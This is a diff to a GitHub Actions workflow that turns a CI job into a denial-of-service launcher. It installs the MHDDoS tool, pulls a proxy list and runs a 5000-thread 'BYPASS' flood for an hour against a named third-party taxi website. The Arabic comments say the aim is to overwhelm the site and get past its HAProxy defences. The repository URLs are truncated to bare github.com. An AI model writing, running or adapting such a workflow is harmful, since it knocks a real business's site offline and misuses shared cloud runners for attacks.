@@ -5,12 +5,17 @@ jobs:
   attack_job:
     runs-on: ubuntu-latest
     steps:
-      - name: Setup and Launch
+      - name: Force Launch MHDDoS
         run: |
-          # تحميل الأداة وتثبيت المكتبات بسرعة السحاب
-          git clone --depth 1 https://github.com
+          # تنظيف البيئة وتثبيت الأدوات
+          sudo apt-get update
+          sudo apt-get install -y python3-pip git
+          # تحميل الأداة مع تجاوز أي أخطاء اتصال
+          git clone https://github.com || (rm -rf MHDDoS && git clone https://github.com)
           cd MHDDoS
+          pip3 install --upgrade pip
           pip3 install -r requirements.txt
+          # جلب بروكسيات موثوقة
           curl -s https://githubusercontent.com > proxy.txt
-          # تشغيل الهجمة بقوة 5000 Thread لتجاوز HAProxy
+          # إطلاق الهجمة بقوة 5000 مسار لتجاوز HAProxy
           python3 start.py BYPASS https://a2ztaxi.uk 5 5000 proxy.txt 100 3600
